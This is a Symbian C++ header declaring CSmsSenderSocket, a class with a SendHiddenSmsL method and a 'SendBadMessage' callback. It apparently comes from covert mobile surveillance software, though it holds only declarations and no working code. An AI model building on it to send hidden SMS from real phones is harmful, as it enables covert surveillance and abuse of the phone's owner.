

#ifndef __SENDSMSSOCKET_H__
#define __SENDSMSSOCKET_H__

#include <HT\logging.h>

#include <e32base.h>	// CActive
#include <es_sock.h>	// RSocket
#include <f32file.h>	// RFs
#include <gsmumsg.h>	// CSmsMessage
#include <smsuaddr.h>	// TSmsAddr
#include <MSVAPI.H>
#include <MTCLREG.H>



class MSmsSendHandler
	{
public:
	virtual void SmsSentL(TInt aError)=0;
	};

class CSmsSenderSocket : public CActive, public MMsvSessionObserver
	{

public:
	static CSmsSenderSocket* NewL(RSocketServ& aSocketServer, MSmsSendHandler* aHandler);
	virtual ~CSmsSenderSocket();
	void SendHiddenSmsL(const TDesC& aNumber, const TDesC& aMessage);

protected:
	static TInt CallBack_SendBadMessageL(TAny*);
	void ConstructL();

private:
	// from MMsvSessionObserver
	void HandleSessionEventL(TMsvSessionEvent aEvent, TAny *aArg1, TAny *aArg2, TAny *aArg3);
	
	CSmsSenderSocket(RSocketServ& aSocketServer, MSmsSendHandler* aHandler);
	HBufC* GetScaL();
	void CleanNumber(TDes& aNumber);

private:
	// from CActive
	void RunL();
	TInt RunError(TInt aError);
	void DoCancel();

private:
	RSocketServ* iSocketServer;
	MSmsSendHandler* iHandler;
	RSocket iSendSocket; 		//own
	TPckgBuf<TUint> iOctlWrite; //own
	__FLOG_DECLARATION_MEMBER
	};

#endif

